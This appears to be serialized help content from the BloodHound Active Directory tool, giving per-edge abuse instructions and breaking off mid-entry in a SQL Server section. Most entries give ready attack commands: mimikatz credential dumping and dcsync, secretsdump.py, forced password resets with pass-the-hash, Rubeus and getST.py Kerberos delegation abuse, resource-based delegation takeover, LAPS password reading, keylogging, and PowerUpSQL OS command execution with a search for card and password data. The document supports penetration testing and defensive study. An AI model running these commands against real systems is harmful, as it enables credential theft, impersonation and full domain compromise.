[{"technique":"GenericAll","windows":{},"linux":{},"abuse":{}},{"technique":"MemberOf","windows":{},"linux":{},"abuse":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"No abuse is necessary. This edge simply indicates that a principal belongs to a security group."},"_owner":null,"_store":{}}},{"technique":"AllExtendedRights","windows":{},"linux":{},"abuse":{}},{"technique":"AdminTo","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Lateral movement"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"There are several ways to pivot to a Windows system. If using Cobalt Strike's beacon, check the help info for the commands \"psexec\", \"psexec_psh\", \"wmi\", and \"winrm\". With Empire, consider the modules for Invoke-PsExec, Invoke-DCOM, and Invoke-SMBExec. With Metasploit, consider the modules \"exploit/windows/smb/psexec\", \"exploit/windows/winrm/winrm_script_exec\", and \"exploit/windows/local/ps_wmi_exec\". With Impacket, consider the example scripts psexec/wmiexec/smbexec/atexec/dcomexec. There are other alternatives like evil-winrm and crackmapexec. Additionally, there are several manual methods for remotely executing code on the machine, including via RDP, with the service control binary and interaction with the remote machine's service control manager, and remotely instantiating DCOM objects. For more information about these lateral movement techniques, see the References tab."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Gathering credentials"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The most well-known tool for gathering credentials from a Windows system is mimikatz. mimikatz is built into several agents and toolsets, including Cobalt Strike's beacon, Empire, and Meterpreter. While running in a high integrity process with SeDebugPrivilege, execute one or more of mimikatz's credential gathering techniques (e.g.: sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the output to find clear-text credentials for other users logged onto the system."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You may also gather credentials when a user types them or copies them to their clipboard! Several keylogging capabilities exist, several agents and toolsets have them built-in. For instance, you may use meterpreter's \"keyscan_start\" command to start keylogging a user, then \"keyscan_dump\" to return the captured keystrokes. Or, you may use PowerSploit's Invoke-ClipboardMonitor to periodically gather the contents of the user's clipboard."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Token Impersonation"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You may run into a situation where a user is logged onto the system, but you can't gather that user's credential. This may be caused by a host-based security product, lsass protection, etc. In those circumstances, you may abuse Windows' token model in several ways. First, you may inject your agent into that user's process, which will give you a process token as that user, which you can then use to authenticate to other systems on the network. Or, you may steal a process token from a remote process and start a thread in your agent's process with that user's token. For more information about token abuses, see the References tab."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Disabling host-based security controls"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Several host-based controls may affect your ability to execute certain techniques, such as credential theft, process injection, command line execution, and writing files to disk. Administrators can often disable these host-based controls in various ways, such as stopping or otherwise disabling a service, unloading a driver, or making registry key changes. For more information, see the References tab."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"HasSession","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Password Theft"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"When a user has a session on the computer, you may be able to obtain credentials for the user via credential dumping or token impersonation. You must be able to move laterally to the computer, have administrative access on the computer, and the user must have a non-network logon session on the computer."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Once you have established a Cobalt Strike Beacon, Empire agent, or other implant on the target, you can use mimikatz to dump credentials of the user that has a session on the computer. While running in a high integrity process with SeDebugPrivilege, execute one or more of mimikatz's credential gathering techniques (e.g.: sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the output to find clear-text credentials for other users logged onto the system."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You may also gather credentials when a user types them or copies them to their clipboard! Several keylogging capabilities exist, several agents and toolsets have them built-in. For instance, you may use meterpreter's \"keyscan_start\" command to start keylogging a user, then \"keyscan_dump\" to return the captured keystrokes. Or, you may use PowerSploit's Invoke-ClipboardMonitor to periodically gather the contents of the user's clipboard."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Token Impersonation"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You may run into a situation where a user is logged onto the system, but you can't gather that user's credential. This may be caused by a host-based security product, lsass protection, etc. In those circumstances, you may abuse Windows' token model in several ways. First, you may inject your agent into that user's process, which will give you a process token as that user, which you can then use to authenticate to other systems on the network. Or, you may steal a process token from a remote process and start a thread in your agent's process with that user's token. For more information about token abuses, see the References tab."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"User sessions can be short lived and only represent the sessions that were present at the time of collection. A user may have ended their session by the time you move to the computer to target them. However, users tend to use the same machines, such as the workstations or servers they are assigned to use for their job duties, so it can be valuable to check multiple times if a user session has started."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AddMember","windows":{},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"net rpc group addmem \"TargetGroup\" \"TargetUser\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["It can also be done with pass-the-hash using"," ",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://github.com/byt3bl33d3r/pth-toolkit","children":"pth-toolkit's net tool"},"_owner":null,"_store":{}},". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"pth-net rpc group addmem \"TargetGroup\" \"TargetUser\" -U \"DOMAIN\"/\"ControlledUser\"%\"LMhash\":\"NThash\" -S \"DomainController\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Finally, verify that the user was successfully added to the group:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"net rpc group members \"TargetGroup\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\""},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"ForceChangePassword","windows":{},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"net rpc password \"TargetUser\" \"newP@ssword2022\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["It can also be done with pass-the-hash using"," ",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://github.com/byt3bl33d3r/pth-toolkit","children":"pth-toolkit's net tool"},"_owner":null,"_store":{}},". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"pth-net rpc password \"TargetUser\" \"newP@ssword2022\" -U \"DOMAIN\"/\"ControlledUser\"%\"LMhash\":\"NThash\" -S \"DomainController\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"GenericWrite","windows":{},"linux":{},"abuse":{}},{"technique":"Owns","windows":{},"linux":{},"abuse":{}},{"technique":"OwnsLimitedRights","windows":{"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["To abuse ownership of an object where the OWNER RIGHTS SID is explicitly granted privileges, you can abuse the specific privileges granted to the OWNER RIGHTS SID.",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"Please refer to the abuse info for the specific privileges granted to OWNER RIGHTS at https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges"]},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"To abuse ownership of an object where the OWNER RIGHTS SID is explicitly granted permissions, you can abuse the specific permissions granted to the OWNER RIGHTS SID."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Please refer to the abuse info for the specific granted permissions at https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"OwnsRaw","windows":{},"linux":{},"abuse":{}},{"technique":"WriteDacl","windows":{},"linux":{},"abuse":{}},{"technique":"WriteOwner","windows":{},"linux":{},"abuse":{}},{"technique":"WriteOwnerLimitedRights","windows":{"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["To abuse change in ownership of an object where the OWNER RIGHTS SID is explicitly granted inherited privileges, you can modify the owner, then abuse the specific privileges granted to the OWNER RIGHTS SID in the context of the new owner.",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"Please refer to the abuse info for the specific privileges granted to OWNER RIGHTS at https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges"]},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["To abuse change in ownership of an object where the OWNER RIGHTS SID is explicitly granted inherited privileges, you can modify the owner, then abuse the specific privileges granted to the OWNER RIGHTS SID in the context of the new owner.",{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"Please refer to the abuse info for the specific privileges granted to OWNER RIGHTS at https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges"]},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},"abuse":{}},{"technique":"WriteOwnerRaw","windows":{},"linux":{},"abuse":{}},{"technique":"CanRDP","windows":{},"linux":{},"abuse":{}},{"technique":"ExecuteDCOM","windows":{},"linux":{},"abuse":{}},{"technique":"AllowedToDelegate","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Abusing this privilege can utilize Benjamin Delpy's Kekeo project, proxying in traffic generated from the Impacket library, or using the Rubeus project's s4u abuse."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the \"HTTP/PRIMARY.testlab.local\" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the \"admin\" user to the \"HTTP/PRIMARY.testlab.local\" SPN. The alternative sname \"cifs\" is substituted in to the final service ticket and the ticket is submitted to the current logon session. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the \"admin\" user."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Rubeus.exe s4u /user:victim /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:admin /msdsspn:\"HTTP/PRIMARY.testlab.local\" /altservice:cifs /ptt"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the \"HTTP/PRIMARY.testlab.local\" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the \"admin\" user to the \"HTTP/PRIMARY.testlab.local\" SPN. The alternative sname \"cifs\" is substituted in to the final service ticket. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the \"admin\" user."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"getST.py -spn 'HTTP/PRIMARY.testlab.local' -impersonate 'admin' -altservice 'cifs' -hashes :2b576acbe6bcfda7294d6bd18041b8fe 'domain/victim'"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"CoerceToTGT","windows":{},"linux":{},"abuse":{}},{"technique":"GetChanges","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"lsadump::dcsync /domain:testlab.local /user:Administrator"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"GetChangesAll","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"lsadump::dcsync /domain:testlab.local /user:Administrator"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"ReadLAPSPassword","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Read the LAPS password attributes listed in the General section."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Plaintext attributes can be read using a simple LDAP client. For example, with PowerView:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Get-DomainComputer \"MachineName\" -Properties \"cn\",\"ms-mcs-admpwd\",\"ms-mcs-admpwdexpirationtime\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Encrypted attributes can be decrypted using Microsoft's LAPS PowerShell module. For example:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Get-LapsADPassword \"WIN10\" -AsPlainText"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["The encrypted attributes can also be retrieved and decrypted using"," ",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt","children":"lapsv2decrypt"},"_owner":null,"_store":{}}," ","(dotnet or BOF)."]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Read the LAPS password attributes listed in the General section."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Plaintext attributes can be read using a simple LDAP client. For example, with bloodyAD:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"See Windows abuse for retrieving and decrypting the encrypted attributes."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"Contains","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Permissions on the parent of a child object may enable compromise of the child object through inherited ACEs or linked GPOs."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"See the inbound edges on the parent object for details."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"GPLink","windows":{"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://github.com/Hackndo/pyGPOAbuse","children":"pyGPOAbuse.py"},"_owner":null,"_store":{}}," ","can be used for that purpose."]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"AddAllowedToAct","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Abusing this primitive is currently only possible through the Rubeus project. First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Rubeus.exe hash /password:Summer2018!"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to \"pretend\" to be \"admin\" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"And finally we can get a service ticket for the service name (sname) we want to \"pretend\" to be \"admin\" for. Impacket's getST.py example script can be used for that purpose."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"AllowedToAct","windows":{},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"We can then get a service ticket for the service name (sname) we want to \"pretend\" to be \"admin\" for. Impacket's getST.py example script can be used for that purpose."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"SQLAdmin","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["Scott Sutherland (",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://twitter.com/_nullbind","children":"@nullbind"},"_owner":null,"_store":{}},") from NetSPI has authored PowerUpSQL, a PowerShell Toolkit for Attacking SQL Server. Major contributors include Antti Rantasaari, Eric Gruber (",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://twitter.com/egru","children":"@egru"},"_owner":null,"_store":{}},"), and Thomas Elling (",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://github.com/thomaselling","children":"@thomaselling"},"_owner":null,"_store":{}},"). Before executing any of the below commands, download PowerUpSQL and load it into your PowerShell instance. Get PowerUpSQL here:"," ",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://github.com/NetSPI/PowerUpSQL","children":"https://github.com/NetSPI/PowerUpSQL"},"_owner":null,"_store":{}},"."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Finding Data"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Get a list of databases, sizes, and encryption status:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Get-SQLDatabaseThreaded –Verbose -Instance sqlserver\\instance –Threads 10 -NoDefaults"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Search columns and data for keywords:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Get-SQLColumnSampleDataThreaded –Verbose -Instance sqlserver\\instance –Threads 10 –Keyword \"card, password\" –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Executing Commands"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Below are examples of PowerUpSQL functions that can be used to execute operating system commands on remote systems through SQL Server using different techniques. The level of access on the operating system will depend largely what privileges are provided to the service account. However, when domain accounts are configured to run SQL Server services, it is very common to see them configured with local administrator privileges."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"xp_cmdshell Execute Example:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Invoke-SQLOSCmd -Verbose -Command \"Whoami\" -Threads 10 -Instance sqlserver\\instance"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Agent Job Execution Examples:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command \"echo hello > c:\\windows\\temp\\test1.txt\" -Instance sqlserver\\instance -username myuser -password mypassword"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output \"hello world\" | out-file c:\\windows\\temp\\test2.txt' -Sleep 20 